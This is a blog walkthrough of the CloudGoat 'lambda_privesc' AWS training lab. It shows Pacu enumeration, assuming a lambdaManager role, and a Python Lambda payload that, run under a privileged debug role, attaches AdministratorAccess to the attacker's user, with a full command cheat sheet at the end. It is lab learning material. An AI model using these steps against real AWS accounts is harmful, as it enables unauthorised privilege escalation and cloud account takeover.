<!DOCTYPE html>
<html lang="en">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="apple-touch-icon" sizes="180x180" href="../../favicon/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="../../favicon/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="../../favicon/favicon-16x16.png">
<link rel="manifest" href="../../favicon/site.webmanifest">
<link rel="mask-icon" href="../../favicon/safari-pinned-tab.svg" color="#5bbad5">



<link
  rel="stylesheet"
  href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css"
/>

<link
  rel="stylesheet"
  href="https://cdn.jsdelivr.net/npm/swiper@11/swiper/css/effect-coverflow.min.css"
/>

<link rel="stylesheet" href="../../css/custom-swiper.css">




<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">
<title itemprop="name"> Cloudgoat Lambda Privesc | Personal Portfolio 
</title>
<meta name="description" content="A biomedical engineering student and cybersecurity enthusiast" />
<meta property="og:title" content="Cloudgoat Lambda Privesc | Personal Portfolio" />
<meta name="twitter:title" content="Cloudgoat Lambda Privesc | Personal Portfolio" />
<meta itemprop="name" content="Cloudgoat Lambda Privesc | Personal Portfolio" />
<meta name="application-name" content="Cloudgoat Lambda Privesc | Personal Portfolio" />
<meta property="og:description"
      content="A biomedical engineering student and cybersecurity enthusiast" />
<meta property="og:site_name" content="Personal Portfolio" />
<meta property="og:url" content="http://localhost:1313/posts/lambdaprivsec_cloudgoat-walkthrough/" />
<meta property="og:locale" content="en">
<meta property="og:image" content="/assets/images/posts/lambda_privesc_challenge.png" />
<meta property="og:image:secure_url" content="http://localhost:1313/assets/images/posts/lambda_privesc_challenge.png" />
<meta property="og:type" content="article" />

<script>
    
    if (localStorage.getItem('color-theme') === 'dark' || (!('color-theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
        document.documentElement.classList.add('dark');
    } else {
        document.documentElement.classList.remove('dark')
    }
</script>




<link rel="stylesheet" href="/css/style.min.0a202f217b79b733be0a4bee09017a95c0ee1defd72592123773a706d3fe0e1f.css" integrity="sha256-CiAvIXt5tzO+CkvuCQF6lcDuHe/XJZISN3OnBtP+Dh8=" />

</head>

<body class="bg-zinc-100 dark:bg-gray-800">
    <div class="top-0 z-50 w-full text-gray-200 bg-gray-900 border-2 border-gray-900 md:sticky border-b-stone-200/10">
    <div x-data="{ open: false }" class="flex flex-col max-w-full px-4 mx-auto md:items-center md:justify-between md:flex-row md:px-6 lg:px-8">
        <div class="flex flex-row items-center justify-between p-4">
            <a href="../../" class="flex text-gray-100 transition duration-1000 ease-in-out group">
                <img src="../../images/cyber-immuno-fusion.png" class="transition-opacity h-9 w-9 group-hover:opacity-50 group-focus:opacity-70" alt="Personal Portfolio Logo" />
                <div class="mt-1 ml-3 text-xl font-black tracking-tight text-gray-100 uppercase transition-colors group-hover:text-gray-400/60">
                    Personal Portfolio</div>
            </a>
            <button class="rounded-lg md:hidden focus:outline-none focus:shadow-outline" @click="open = !open" role="navigation" aria-expanded="false" aria-label="Main" aria-controls="menuItems">
                <svg fill="currentColor" viewBox="0 0 20 20" class="w-6 h-6">
                    <path x-show="!open" fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM9 15a1 1 0 011-1h6a1 1 0 110 2h-6a1 1 0 01-1-1z" clip-rule="evenodd"></path>
                    <path x-show="open" fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path>
                </svg>
            </button>
        </div>
        <nav :class="{'flex': open, 'hidden': !open}" class="flex-col flex-grow hidden pb-4 md:pb-0 md:flex md:justify-end md:flex-row">
            
            
            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/" title="Home">
                Home
            </a>
            
            
            
            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/about/" title="About">
                About
            </a>
            
            
            
            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/biomedical/" title="Biomedical">
                Biomedical
            </a>
            
            
            
            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/software/" title="Software">
                Software
            </a>
            
            
            
            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/cybersecurity/" title="Cybersecurity">
                Cybersecurity
            </a>
            
            
            
            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/posts/" title="Walkthroughs">
                Walkthroughs
            </a>
            
            
            
            <button id="theme-toggle" type="button" class="p-2 text-sm text-gray-500 rounded-lg md: dark:text-gray-400 md:hover:bg-gray-100 dark:md:hover:bg-gray-700 md:focus:outline-none md:focus:ring-4 md:focus:ring-gray-200 dark:md:focus:ring-gray-700 md:ml-2 xs:hidden">
                <svg id="theme-toggle-dark-icon" class="hidden w-5 h-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                    <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z">
                    </path>
                </svg>
                <svg id="theme-toggle-light-icon" class="hidden w-5 h-5" fill="currentColor" viewBox="0 0 20 20" aria-label="Dark or Light Mode" xmlns="http://www.w3.org/2000/svg">
                    <path d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"></path>
                </svg>
            </button>
            
        </nav>
    </div>
</div>
    
<article>
  <header class="mb-4 bg-primary-600">
    <span class="py-96">
      <h1 class="py-16 text-5xl font-black text-center text-white capitalize">
        Cloudgoat Lambda Privesc
      </h1>
    </span>
  </header>
  <div class="max-w-4xl mx-auto mt-8 mb-2">
    <div class="px-6">
      
      
      
      
      
      
      <img src="../../../assets/images/posts/lambda_privesc_challenge_hu_9a75695f518c7e3d.webp" srcset=", /../assets/images/posts/lambda_privesc_challenge_hu_e01ab61ab034736e.webp 400w, /../assets/images/posts/lambda_privesc_challenge_hu_f82adbbe7e59535.webp 550w, /../assets/images/posts/lambda_privesc_challenge_hu_22dea22fa75ac1ff.webp 768w, /../assets/images/posts/lambda_privesc_challenge_hu_9a75695f518c7e3d.webp 1100w"
           class="object-fill overflow-hidden rounded-lg shadow-lg ring-4 ring-zinc-300/40 dark:ring-gray-900/40 shadow-neutral-100/20 dark:shadow-neutral-800/40"
           width="100%" alt="" />
      
      
    </div>
  </div>
  
  <div class="max-w-2xl px-6 pt-6 pb-16 mx-auto prose dark:prose-invert dark:text-white">
    <h1 id="introduction--context">Introduction &amp; Context</h1>
<p>Hey guys, this is a write-up for the Lambda_privesc challenge from Cloudgoat, available <a href="https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/lambda_privesc/README.md">here</a>. This is a challenge focused on assuming a role and then using that to escalate permissions via a vulnerable account. The account allows you to run a lambda function, eventually allowing you to gain full admin access. This is another challenge part of the Tyler&rsquo;s <a href="https://academy.simplycyber.io/l/pdp/introduction-to-aws-pentesting">Intro to AWS Pentesting course</a>. But I was able to do this one on my own, so it&rsquo;s definetly doable. I will note that I did read the summaryof the challenge which gave a decent hint on the attack path, but I&rsquo;ll explain how you could find that too on your own. Now onto the lab!</p>
<h1 id="setup">Setup</h1>
<p>We need to start up cloudgoat first and then add the profile details in to an account as well.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cloudgoat create lambda_privesc
</span></span><span style="display:flex;"><span><span style="color:#75715e">#You&#39;ll get something like: </span>
</span></span><span style="display:flex;"><span>cloudgoat_output_chris_access_key_id <span style="color:#f92672">=</span> A_KEY_ID
</span></span><span style="display:flex;"><span>cloudgoat_output_chris_secret_key <span style="color:#f92672">=</span> SECRET_KEY_VALUE
</span></span></code></pre></div><p>Add the keys using <code>aws configure --profile lambda_priv</code>.</p>
<p>Then of course, let&rsquo;s just verity it works by running <code>aws sts get-caller-identity --profile lambda_priv</code>. It should work just like that. Once that is set up, we start enumerating.</p>
<h1 id="enumeration">Enumeration!</h1>
<h2 id="enumerate-ourself">Enumerate ourself</h2>
<p>There&rsquo;s more than a couple ways of doing this, I&rsquo;m trying to get familiar with Pacu, so that&rsquo;s the path I went down. One thing I did learn though is that a potential &lsquo;flaw&rsquo; of automated enumeration is you often get a lot of information. Sometimes too much. You&rsquo;ll need to be able to find the key information and ignore the &rsquo;noise&rsquo; that comes along with it. But you&rsquo;ll see that when time comes. Let&rsquo;s start by launching pacu and then grabbing the keys from our aws profile.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pacu
</span></span><span style="display:flex;"><span>import_keys lambda_priv
</span></span></code></pre></div><p>Now in the last cloudgoat challenge I did this command didn&rsquo;t work and I had to bruteforce it, but let&rsquo;s just give it a shot. Run <code>run iam__enum_permissions</code>. And surprise surprise, it worked! Maybe too well. If you run <code>whoami</code> to check what it finds, you&rsquo;ll see a lot of permissions. The important things I think to note are:</p>
<ul>
<li>Lots of IAM permissions
<ul>
<li>From the cheatsheet in the course, he mentions the <code>assume-role</code> permission could be helpful, so note that down.</li>
</ul>
</li>
<li>Nothing explicilty denied
<ul>
<li>If something is denied in a CTF, it&rsquo;s probably something to go after I would think</li>
</ul>
</li>
<li>A policy called <code>cg-chris-policy-cgidasldh6kuco</code> is attached.
<ul>
<li>This might be useful, depending on what this could do. We&rsquo;ll see.</li>
</ul>
</li>
</ul>
<h2 id="enumerate-the-environment">Enumerate the environment</h2>
<p>I&rsquo;m going to continue using pacu for this (I promise it&rsquo;s just enumeration I&rsquo;m going to automate here). But run <code>run iam__enum_users_roles_policies_groups</code> and we&rsquo;ll get some useful results. If you run <code>data iam</code> you can see the output. But if you&rsquo;re like me, you&rsquo;ll find it a bit overwhelming, sinces there&rsquo;s so much. It may be helpful to filter on the 4 categories by running commands like <code>data iam Users</code> to view a section&rsquo;s data one at a time.Â </p>
<h3 id="group">Group</h3>
<p>No groups found on this challenge, off to the next one.</p>
<h3 id="policies">Policies</h3>
<ol>
<li>The first policy is the one attached to us. Nothing really extra helpful here.</li>
<li>The second policy is new. A policy related to a lambdaManager. This could be helpful. The lab is focused on using lambda for privilege sscalation, so this has to be important.</li>
</ol>
<h3 id="roles">Roles</h3>
<ol>
<li>Default amazon role, not typically a target</li>
<li>Another default role</li>
<li>A debug role? This role is allow assumable by the a lambda thought it seems.</li>
<li>The lambdaManager role! We saw a policy related to this earlier. This role can be assumed by chris. It&rsquo;s called the lambda manager so it probably can run stuff related to lambdas.</li>
</ol>
<h3 id="users">Users</h3>
<ol>
<li>Me!</li>
<li>The default cloudgoat account I would assume. Nothing too useful here</li>
</ol>
<h3 id="key-points">Key Points</h3>
<p>It would seem that Chris can take on the role of the lambda manager. There is another debug role that can only be accessed by a lambda. That combined by the summary on the scenario page, gives a good idea of the attack path. We take on the role of the lambda manager then run a lambda using the debug role to grant ourselves admin access.</p>
<p>Now as I was thinking this through, I looked up potential attack paths using a lambda function and found <a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/">this page</a>. If you scroll down to 15, you&rsquo;ll find a mini walkthrough of all the steps we need to get ourselves the admin access we want. This is the privilege escalation we&rsquo;ll take. I&rsquo;ll walk through this next.</p>
<p>Now I&rsquo;ll note that I said it &lsquo;seems&rsquo; and &lsquo;probably&rsquo; when discussing the roles. I never actually verified the information on those roles, I kinda just went off the names. Not the best thing in hindsight. So if you want to verify it before going on run <code>aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-lambdaManager-policy-cgidasldh6kuco --version-id v1 --profile chris</code> (replace the arn with the 2nd policy from the list of policies found)</p>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<h2 id="assume-role">Assume Role</h2>
<p>So first thing is to figure out how to assume the role of the lambda manager. I asked ChatGPT for the command: <code>aws sts assume-role --role-arn arn:aws:iam::381491899745:role/cg-lambdaManager-role-cgidasldh6kuco --role-session-name escalateSession --region us-east-1 --output json --profile lambda_priv</code>. Quite a long one.</p>
<p>Once you run that you&rsquo;ll get a json response detailing some credentials and the session token to take on this new role. Same way as we configured the first one, but we&rsquo;ll need to add they session in manually afterwards:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws configure --profile lambda_priv_new
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Pass in keys</span>
</span></span><span style="display:flex;"><span>aws configure set profile.lambda_priv_new.aws_session_token PASTEVALUEHERE
</span></span></code></pre></div><p>And verify you got this new role by running <code>aws sts get-caller-identity</code> and it should tell you that you&rsquo;re the lambda manager!</p>
<h2 id="strike">Strike!</h2>
<p>Now to launch the actual attack, I copied pasted the instructions from the <a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/">website</a> we found earlier,  and has ChatGPT provide the code and commands needed.</p>
<p>First step is to create the python code that will give you the admin access policy. Create a file caled <code>exploit.py</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> boto3
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">lambda_handler</span>(event, context):
</span></span><span style="display:flex;"><span>    iam <span style="color:#f92672">=</span> boto3<span style="color:#f92672">.</span>client(<span style="color:#e6db74">&#39;iam&#39;</span>)
</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> iam<span style="color:#f92672">.</span>attach_user_policy(
</span></span><span style="display:flex;"><span>        UserName<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;chris-cgidasldh6kuco&#39;</span>,
</span></span><span style="display:flex;"><span>        PolicyArn<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;arn:aws:iam::aws:policy/AdministratorAccess&#39;</span>
</span></span><span style="display:flex;"><span>    )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;statusCode&#39;</span>: <span style="color:#ae81ff">200</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;body&#39;</span>: response
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>If you aren&rsquo;t familiar with python, this script is adding a new policy to the <code>Chris</code> user. It&rsquo;s defining a function called <code>lambda_handler</code> that takes in a couple values and then attempts to add a user policy  to <code>Chris</code>. Not very error safe though, it&rsquo;s just returning 200, but if something does go wrong, we&rsquo;d probably see the results in the log.</p>
<p>We need to zip it up too before we can send it. You can do that by running <code>zip payload.zip exploit.py</code>. Then we gotta crete the function using this command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws lambda create-function --function-name escalate-admin-cg --runtime python3.9 --role arn:aws:iam::381491899745:role/cg-debug-role-cgidasldh6kuco --handler lambda_function.lambda_handler --zip-file fileb://payload.zip --region us-east-1 --profile lambda_priv_new
</span></span></code></pre></div><p>Note:</p>
<ul>
<li>We&rsquo;re setting the runtime to python 3.9</li>
<li>The role being assigned is the debug role, which has admin access</li>
<li>We&rsquo;re running it using the new role we assumed.</li>
<li>Think of as manipulating a file that has root access on a linux machine. We&rsquo;re running the lambda using a role that has superior access to give us administrator access.</li>
</ul>
<p>Next we invoke the function using</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws lambda invoke --function-name escalate-admin-cg output.txt --region us-east-1 --profile lambda_priv_new
</span></span></code></pre></div><p>It said 200 in the response, which is generally a good thing. Let&rsquo;s check if we have the role attached to the chris user now with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws iam list-attached-user-policies --user-name chris-cgidasldh6kuco --region us-east-1 --profile lambda_priv
</span></span></code></pre></div><p>The response should now show we have <code>AdministratorAccess</code> on our policy list. And that&rsquo;s the end!</p>
<h1 id="conclusion">Conclusion</h1>
<p>We managed to find a couple of roles with elevated permissions. We could not directly take on the role with admin access, but were able to go through a &lsquo;middleman&rsquo; to get the super account to run a lambda function. We had that lambda function execute a python script that gave us the admin access. Quite a long attack chain, but there we go, Pprivilege escalation using lambda functions.</p>
<p><em>Don&rsquo;t forget to run the following commands to shut down your resources in AWS</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cloudgoat destroy lambda_privesc
</span></span><span style="display:flex;"><span>aws lambda delete-function --function-name escalate-admin-cg
</span></span></code></pre></div><h1 id="cheat-sheet">Cheat Sheet</h1>
<p>To close off, here&rsquo;s a quick summary of the commands we needed to run to complete this module. If you&rsquo;re ever coming back to this and just need that one command, this is the section to check.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#Start Up</span>
</span></span><span style="display:flex;"><span>cloudgoat create lambda_privesc
</span></span><span style="display:flex;"><span>aws configure --profile lambda_priv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Enumeration of chris &amp; environment</span>
</span></span><span style="display:flex;"><span>aws sts get-caller-identity --profile lambda_priv
</span></span><span style="display:flex;"><span>pacu
</span></span><span style="display:flex;"><span>    import_keys
</span></span><span style="display:flex;"><span>    run iam__enum_permissions
</span></span><span style="display:flex;"><span>    run iam__enum_users_roles_policies_groups
</span></span><span style="display:flex;"><span>exit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-lambdaManager-policy-cgidasldh6kuco --version-id v1 --profile chris
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Assume the new role</span>
</span></span><span style="display:flex;"><span>aws sts assume-role --role-arn arn:aws:iam::381491899745:role/cg-lambdaManager-role-cgidasldh6kuco --role-session-name escalateSession --region us-east-1 --output json --profile lambda_priv
</span></span><span style="display:flex;"><span>aws configure --profile lambda_priv
</span></span><span style="display:flex;"><span>aws configure set profile.lambda_priv_new.aws_session_token TOKEN
</span></span><span style="display:flex;"><span>aws sts get-caller-identity --profile lambda_priv_new
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Attack!</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Create the exploit script</span>
</span></span><span style="display:flex;"><span>aws lambda create-function --function-name escalate-admin-cg --runtime python3.9 --role arn:aws:iam::381491899745:role/cg-debug-role-cgidasldh6kuco --handler lambda_function.lambda_handler --zip-file fileb://payload.zip --region us-east-1 --profile lambda_priv_new
</span></span><span style="display:flex;"><span>aws lambda invoke --function-name escalate-admin-cg output.txt --region us-east-1 --profile lambda_priv_new
</span></span><span style="display:flex;"><span>aws iam list-attached-user-policies --user-name chris-cgidasldh6kuco --region us-east-1 --profile lambda_priv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Shut down</span>
</span></span><span style="display:flex;"><span>cloudgoat destroy lambda_privesc
</span></span><span style="display:flex;"><span>aws lambda delete-function --function-name escalate-admin-cg
</span></span></code></pre></div><pre tabindex="0"><code></code></pre>
  </div>
</article>

    
<script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>

<script src="../../js/darkmode.js" defer></script>
  


  
  <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js" defer></script>

  <script defer>
    document.addEventListener('DOMContentLoaded', () => {
      new Swiper('.swiper', {
        effect: 'coverflow',
        grabCursor: true,
        centeredSlides: true,

        slidesPerView: 'auto',
        spaceBetween: 30,
        loop: true,

        coverflowEffect: {
          rotate: 30,
          stretch: 0,
          depth: 150,
          modifier: 1,
          slideShadows: true,
        },

        
        pagination: {
          el: '.swiper-pagination',
          clickable: true,
        },
        
        navigation: {
          nextEl: '.swiper-button-next',
          prevEl: '.swiper-button-prev',
        },

        on: {
          slideChange() {
            
            const idx = this.realIndex;
            document.getElementById('cert-caption').innerText = certData[idx].description;
          }
        }
      });
    });
  </script>



<footer class="bg-gray-900">
    <div class="max-w-md px-4 py-12 mx-auto overflow-hidden sm:max-w-3xl sm:px-6 lg:max-w-7xl lg:px-8">
        <nav class="flex flex-wrap justify-center -mx-5 -my-2" aria-label="Footer">
            
            <div class="px-5 py-2">
                <a href="http://localhost:1313/about/" class="text-base text-gray-400 hover:text-gray-300">About</a>
            </div>
            
            <div class="px-5 py-2">
                <a href="http://localhost:1313/biomedical/" class="text-base text-gray-400 hover:text-gray-300">Biomedical</a>
            </div>
            
            <div class="px-5 py-2">
                <a href="http://localhost:1313/software/" class="text-base text-gray-400 hover:text-gray-300">Software</a>
            </div>
            
            <div class="px-5 py-2">
                <a href="http://localhost:1313/cybersecurity/" class="text-base text-gray-400 hover:text-gray-300">Cybersecurity</a>
            </div>
            
            <div class="px-5 py-2">
                <a href="http://localhost:1313/posts/" class="text-base text-gray-400 hover:text-gray-300">Walkthroughs</a>
            </div>
            
        </nav>
        <p class="mt-8 text-base text-center text-gray-400">&copy; 2025
            Personal Portfolio. All rights
            reserved.</p>
        <p class="mt-2 text-base text-center text-gray-400">Theme made with &#x2764;&#xfe0f; by <a
               href="https://nusserstudios.com" class="hover:underline hover:text-primary-600"><span
                      class="font-black uppercase">Nusser</span> <span class="font-light uppercase">Studios.</span></a>
        </p>
    </div>
</footer>
</body>

</html>